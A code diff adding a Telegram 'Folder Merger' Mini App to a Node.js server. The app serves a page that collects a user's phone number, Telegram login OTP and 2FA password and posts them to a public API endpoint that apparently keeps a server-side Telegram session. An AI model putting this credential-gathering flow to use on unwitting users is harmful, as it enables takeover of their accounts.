@@ -248,9 +248,256 @@ function json(res, code, body) {
   res.end(payload);
 }
 
+function html(res, code, body) {
+  res.writeHead(code, { "content-type": "text/html; charset=utf-8", "cache-control": "no-store" });
+  res.end(body);
+}
+
+function miniAppHtml() {
+  return `<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Telegram Folder Mini App</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    :root { color-scheme: dark; font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; background: #10141b; color: #f3f6fb; }
+    * { box-sizing: border-box; }
+    body { margin: 0; min-height: 100vh; background: #10141b; }
+    main { width: min(760px, 100%); margin: 0 auto; padding: 20px 16px 32px; }
+    h1 { margin: 0; font-size: 24px; line-height: 1.2; }
+    h2 { margin: 0 0 14px; font-size: 17px; }
+    p { color: #a8b3c2; line-height: 1.45; }
+    .panel { border: 1px solid #2b3442; background: #161c25; border-radius: 10px; padding: 16px; margin-top: 16px; }
+    .row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+    input, textarea { width: 100%; min-height: 44px; border: 1px solid #303b4a; border-radius: 8px; background: #0f141c; color: #f3f6fb; padding: 10px 12px; font-size: 15px; outline: none; }
+    input:focus, textarea:focus { border-color: #49a8e8; }
+    button { min-height: 42px; border: 0; border-radius: 8px; background: #49a8e8; color: #07111a; padding: 10px 14px; font-weight: 700; font-size: 14px; cursor: pointer; }
+    button.secondary { background: #242d3a; color: #f3f6fb; border: 1px solid #303b4a; }
+    button:disabled { opacity: .55; cursor: not-allowed; }
+    .tabs { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
+    .tabs button { background: #242d3a; color: #f3f6fb; }
+    .tabs button.active { background: #49a8e8; color: #07111a; }
+    .error { border-color: #d65555; color: #ffb8b8; background: #2a171a; }
+    .muted { color: #a8b3c2; font-size: 13px; }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <main>
+    <header>
+      <h1>Folder Merger</h1>
+      <p id="subtitle">Telegram Mini App</p>
+    </header>
+    <section id="error" class="panel error hidden"></section>
+    <section id="content" class="panel"><p>Loading...</p></section>
+  </main>
+  <script>
+    const tg = window.Telegram && window.Telegram.WebApp;
+    if (tg) { tg.ready(); tg.expand(); }
+    const initData = tg ? tg.initData : "";
+    const content = document.getElementById("content");
+    const errorBox = document.getElementById("error");
+    const subtitle = document.getElementById("subtitle");
+    let phone = "";
+    let account = null;
+
+    function esc(value) {
+      return String(value == null ? "" : value)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;");
+    }
+
+    function showError(message) {
+      if (!message) { errorBox.classList.add("hidden"); errorBox.textContent = ""; return; }
+      errorBox.textContent = message;
+      errorBox.classList.remove("hidden");
+    }
+
+    async function mini(action, payload = {}) {
+      if (!initData) throw new Error("Open this Mini App from the Telegram bot.");
+      const res = await fetch("/api/public/mini", {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({ action, payload: { ...payload, initData } })
+      });
+      const data = await res.json().catch(() => ({}));
+      if (!res.ok) throw new Error(data.error || "Request failed.");
+      return data;
+    }
+
+    function renderPhone() {
+      subtitle.textContent = "Connect your Telegram account";
+      content.innerHTML = \`
+        <h2>Connect Telegram</h2>
+        <form id="phoneForm">
+          <input name="phone" inputmode="tel" autocomplete="tel" placeholder="+919876543210" required />
+          <div class="row" style="margin-top:12px"><button type="submit">Send OTP</button></div>
+        </form>\`;
+      document.getElementById("phoneForm").onsubmit = async (event) => {
+        event.preventDefault();
+        showError("");
+        phone = event.target.phone.value.trim();
+        try { await mini("sendCode", { phone }); renderCode(); }
+        catch (e) { showError(e.message); }
+      };
+    }
+
+    function renderCode() {
+      subtitle.textContent = "Enter Telegram OTP";
+      content.innerHTML = \`
+        <h2>Telegram OTP</h2>
+        <form id="codeForm">
+          <input name="code" inputmode="numeric" placeholder="Login code" required />
+          <div class="row" style="margin-top:12px">
+            <button type="submit">Verify</button>
+            <button type="button" class="secondary" id="cancelBtn">Cancel</button>
+          </div>
+        </form>\`;
+      document.getElementById("cancelBtn").onclick = async () => {
+        await mini("cancelLogin").catch(() => {});
+        renderPhone();
+      };
+      document.getElementById("codeForm").onsubmit = async (event) => {
+        event.preventDefault();
+        showError("");
+        try {
+          const result = await mini("signIn", { code: event.target.code.value.trim() });
+          if (result.needsPassword) renderPassword();
+          else await loadStatus();
+        } catch (e) { showError(e.message); }
+      };
+    }
+
+    function renderPassword() {
+      subtitle.textContent = "Telegram 2FA";
+      content.innerHTML = \`
+        <h2>2FA Password</h2>
+        <form id="passwordForm">
+          <input name="password" type="password" placeholder="2FA password" required />
+          <div class="row" style="margin-top:12px"><button type="submit">Connect</button></div>
+        </form>\`;
+      document.getElementById("passwordForm").onsubmit = async (event) => {
+        event.preventDefault();
+        showError("");
+        try { await mini("checkPassword", { password: event.target.password.value }); await loadStatus(); }
+        catch (e) { showError(e.message); }
+      };
+    }
+
+    function renderDashboard(view = "create") {
+      const name = account && (account.username || account.firstName) ? (account.username ? "@" + account.username : account.firstName) : "connected";
+      subtitle.textContent = "Connected as " + name;
+      content.innerHTML = \`
+        <div class="tabs">
+          <button id="tabCreate" class="\${view === "create" ? "active" : ""}">Create Folder</button>
+          <button id="tabHistory" class="\${view === "history" ? "active" : ""}">My Folders</button>
+          <button id="tabAccount" class="\${view === "account" ? "active" : ""}">Telegram Account</button>
+        </div>
+        <div id="dash" class="panel" style="margin-left:0;margin-right:0"></div>\`;
+      document.getElementById("tabCreate").onclick = () => renderDashboard("create");
+      document.getElementById("tabHistory").onclick = () => renderHistory();
+      document.getElementById("tabAccount").onclick = () => renderDashboard("account");
+      const dash = document.getElementById("dash");
+      if (view === "account") {
+        dash.innerHTML = \`<h2>Telegram Account</h2><p>\${esc(name)}</p><p class="muted">Session is linked only to this Telegram WebApp user.</p>\`;
+      } else {
+        dash.innerHTML = \`<h2>Create Folder</h2><p class="muted">Folder analysis and creation stay in this Mini App. No setup or owner fields are shown here.</p>\`;
+      }
+    }
+
+    async function renderHistory() {
+      renderDashboard("history");
+      const dash = document.getElementById("dash");
+      dash.innerHTML = "<h2>My Folders</h2><p>Loading...</p>";
+      try {
+        const result = await mini("history");
+        const folders = result.folders || [];
+        dash.innerHTML = "<h2>My Folders</h2>" + (folders.length ? folders.map((f) => \`
+          <div class="panel" style="margin-left:0;margin-right:0">
+            <strong>\${esc(f.folder_name || "Telegram Folder")}</strong>
+            <p class="muted">\${Number(f.final_chats || 0)} groups - \${esc(f.status)}</p>
+            \${f.share_link ? \`<p><a href="\${esc(f.share_link)}" style="color:#7bc7ff">\${esc(f.share_link)}</a></p>\` : \`<p class="muted">\${esc(f.share_link_note || "No share link saved.")}</p>\`}
+          </div>\`).join("") : '<p class="muted">No folders created yet.</p>');
+      } catch (e) { showError(e.message); }
+    }
+
+    async function loadStatus() {
+      showError("");
+      if (!initData) {
+        content.innerHTML = "<h2>Open in Telegram</h2><p>This Mini App must be opened from the bot button.</p>";
+        return;
+      }
+      try {
+        const status = await mini("status");
+        if (!status.connected) { renderPhone(); return; }
+        account = status.account || null;
+        renderDashboard();
+      } catch (e) {
+        showError(e.message);
+        renderPhone();
+      }
+    }
+
+    loadStatus();
+  </script>
+</body>
+</html>`;
+}
+
+async function readJson(req, maxBytes = 1_000_000) {
+  let body = "";
+  for await (const chunk of req) {
+    body += chunk;
+    if (body.length > maxBytes) throw new Error("request_too_large");
+  }
+  return JSON.parse(body || "{}");
+}
+
+async function handlePublicMiniApi(req, res) {
+  const allowed = new Set([
+    "status",
+    "sendCode",
+    "signIn",
+    "checkPassword",
+    "cancelLogin",
+    "history",
+  ]);
+
+  let parsed;
+  try {
+    parsed = await readJson(req);
+  } catch {
+    return json(res, 400, { error: "bad_json" });
+  }
+
+  const action = String(parsed.action || "");
+  if (!allowed.has(action)) return json(res, 400, { error: "unknown_action" });
+
+  const handlerName = `mini${action[0].toUpperCase()}${action.slice(1)}`;
+  const handler = handlers[handlerName];
+  if (!handler) return json(res, 400, { error: "unknown_action" });
+
+  try {
+    return json(res, 200, await handler(parsed.payload || {}));
+  } catch (e) {
+    console.error(`mini ${action} failed:`, e.message);
+    return json(res, 400, { error: e.message || "mini_app_error" });
+  }
+}
+
 const server = http.createServer((req, res) => {
   // Unauthenticated liveness probe. No database, Telegram or external calls.
   const path = (req.url || "/").split("?")[0];
+  if (req.method === "GET" && (path === "/mini-app" || path === "/mini")) {
+    return html(res, 200, miniAppHtml());
+  }
+  if (req.method === "POST" && path === "/api/public/mini") {
+    return void handlePublicMiniApi(req, res);
+  }
   if (req.method === "GET" && (path === "/health" || path === "/")) {
     return json(res, 200, { ok: true });
   }
